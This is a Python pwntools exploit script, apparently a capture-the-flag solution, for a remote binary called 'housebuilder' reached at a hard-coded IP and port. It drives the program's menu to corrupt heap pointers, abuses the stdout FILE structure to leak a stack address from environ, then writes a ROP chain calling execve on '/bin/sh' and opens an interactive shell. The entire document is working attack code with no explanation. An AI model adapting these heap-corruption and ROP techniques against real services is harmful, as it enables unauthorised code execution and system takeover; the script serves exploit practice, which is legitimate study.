from pwn import *

#io = process("./housebuilder")
io = remote("151.236.114.211",17174)

def add(name,rooms,floors,people):
    io.sendlineafter("{$} > ","1")
    io.sendlineafter("{?} Enter name: ",name)
    io.sendlineafter("{?} Enter rooms count: ",str(rooms))
    io.sendlineafter("{?} Enter floors count: ",str(floors))
    io.sendlineafter("{?} Enter peoples count: ",str(people))

def delete(idx):
    io.sendlineafter("{$} > ","4")
    io.sendlineafter("{?} Enter house idx: ",str(idx))

def view():
    io.sendlineafter("{$} > ","3")

def sub(idx):
    io.sendlineafter("{$} > ","2")
    io.sendlineafter("{?} Enter house idx: ",str(idx))

def sell():
    io.sendlineafter("} > ","3")

def desc(desc):
    io.sendlineafter("} > ","2")
    io.sendlineafter("{?} Enter new description: ",desc)

def info():
    io.sendlineafter("} > ","1")

def back():
    io.sendlineafter("} > ","4")

## houselist = 0x5d64c0
add("aaaa",2,2,2)  # 0
add("bbbb",2,2,2)  # 1
add("cccc",2,2,2)  # 2
add("dddd",2,2,2)  # 3
add("eeee",2,2,2)  # 4
delete(1)
sub(0)
sell()
info()
io.recvuntil("Floors: ")
heap = hex(int(io.recvline().strip(),10))
log.info("heap @ "+str(heap))
environ = 0x5da448
env = 0x5da458
hook = 0x5d4bb0#0x5da3d8
stdout = 0x00000000005d4740
desc(p64(stdout))#(int(heap,16)+0x142c8)) ## overwriting chunk 2's name ptr
back()
add("abcd",2,2,2)  # 3

add("a",2,2,2) # 0
payload = p64(0x0fbad3887)+ p64(0)*3+p64(environ) + p64(env)*2

sub(0)
desc(payload)
leak = u64(io.recv(6)+"\x00\x00")-0x140
log.info("leak @ "+str(hex(leak)))
back()
delete(3)
sub(4)
sell()
desc(p64(leak))
back()

pop_rax = 0x000000000041fcba
pop_rdi = 0x000000000041432a
pop_rsi = 0x0000000000407668
syscall = 0x0000000000403c73
pop_rdx = 0x00000000004044cf
nop = 0x0000000000404d0f
sh = int(heap,16) + 0x14b98

add("/bin/sh\x00",2,2,2)  # 1
add("ffff",2,2,2) # 3
sub(3)
payload  = p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(sh) +p64(leak-0x100)+ p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)
payload = p64(nop)*50 + payload
#gdb.attach(io)
desc(payload)
#back()
io.interactive()
